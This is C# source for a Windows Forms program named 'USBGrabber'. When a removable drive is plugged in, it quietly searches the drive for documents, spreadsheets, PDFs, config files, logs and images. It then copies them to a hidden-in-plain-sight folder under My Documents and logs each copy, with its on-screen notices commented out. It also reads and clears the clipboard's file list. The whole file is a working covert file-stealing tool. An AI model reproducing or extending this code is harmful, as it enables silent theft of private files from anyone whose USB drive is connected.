using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace USBGrabber
{
    public partial class Form1 : Form
    {

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);

            const int WM_DeviceChange = 0x219;
            const int DBT_DEVICEARRIVAL = 0x8000;
            const int DBT_DEVICEREMOVECOMPLETE = 0X8004;

            if (m.Msg == WM_DeviceChange)
            {
                Thread T = new Thread(SearchFilesAndGet);
                if (m.WParam.ToInt32() == DBT_DEVICEARRIVAL)
                {
                    T.Start();
                   // MessageBox.Show("SearchFilesAndGet Started");
                }
                if (m.WParam.ToInt32() == DBT_DEVICEREMOVECOMPLETE)
                {
                    T.Abort();
                  //  MessageBox.Show("SearchFilesAndGet Stopped");
                }
            }
        }
        public ListBox list = new ListBox();

        private ArrayList F = new ArrayList();
        private void SearchFilesAndGet()
        {
            Thread.Sleep(4000);
            list.Items.Add("*.xls*");
            list.Items.Add("*.doc*");
            list.Items.Add("*.txt*");
            list.Items.Add("*.log*");
            list.Items.Add("*.conf*");
            list.Items.Add("*.ppt*");
            list.Items.Add("*.pdf*");
            list.Items.Add("*.jpg*");
            foreach (var i in DriveInfo.GetDrives())
            {
                if (i.IsReady && i.DriveType == DriveType.Removable)
                {
                    for (int j = 0; j < list.Items.Count; j++)
                    { 
                        try
                        {
                            foreach (string file in Directory.GetFiles(@i.Name, list.Items[j].ToString(), SearchOption.AllDirectories))
                            {
                                F.Add(new FILEclass(file, Path.GetFileName(file)));
                            }
                        } catch { }
                    }
                   // MessageBox.Show("Search Compleated !");
                }
                CopyFiles();
            }
        }
        private void CopyFiles()
        {
            string Dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +  @"\CopiedFiles\" + 
                DateTime.Now.ToString("yyyy-MM-dd-hh-mm");
            //File.Create(Dir + @"\Log.txt");
            Directory.CreateDirectory(Dir);

            int copied = 0; int copy_err = 0; int exist = 0;
            for (int i = 0; i < F.Count; i++)
            {
                string sourceName = Path.GetFileName(((FILEclass)(F[i])).Fullname);
                string source = ((FILEclass)(F[i])).Fullname;
                string destination = Dir + @"\" + ((FILEclass)(F[i])).name;
                string destName = Path.GetFileName(Dir + @"\" + ((FILEclass)(F[i])).name);
                if (sourceName.Equals(destName))
                {
                    if (File.Exists(source))    
                    {
                        if (true/*File.Exists(destination)*/)
                        {
                            try
                            {
                                //if (FileCompare)
                                //else
                                File.Copy(source, destination, true);
                                File.AppendAllText(Dir + @"\Log.txt", "\n\n===The File " + source + " copied to the " + destination +
                                    " successfully at " + DateTime.Now.ToString("yyyy-MM-dd-hh-mm-ss"));
                                //MessageBox.Show("Copied " + source + " to the " + destination);
                            }
                            catch 
                            {
                                copy_err++;
                            }
                            copied++;
                        }
                    }
                    else
                    {
                        copy_err++;
                    }
                }
                //MessageBox.Show(copy_err.ToString() + " Errors");
            }
        }
        public Form1()
        {
            InitializeComponent();
            time.Tick += Time_Tick;
            time.Start();
        }

        private void Time_Tick(object sender, EventArgs e)
        {
            if (Clipboard.ContainsFileDropList())
            {
                clipList.Clear();
                int length = Clipboard.GetFileDropList().Count;
                string txt2 = "";
                for (int i = 0; i < length; i++)
                {
                    clipList.Add(Clipboard.GetFileDropList()[i]);
                    txt2 += clipList[i].ToString() + "\t";
                    //MessageBox.Show(txt[i].ToString());
                }
                Clipboard.Clear();

                MessageBox.Show(txt2, "Все файлы в буфере", MessageBoxButtons.OKCancel,
                    MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
            }
        }
        public ArrayList clipList = new ArrayList();
        public System.Windows.Forms.Timer time = new System.Windows.Forms.Timer();
    }
    public class FILEclass
    {
        public string Fullname;
        public string name;
        public FILEclass(string Fullname, string name)
        {
            this.Fullname = Fullname;
            this.name = name;
        }
    }
}
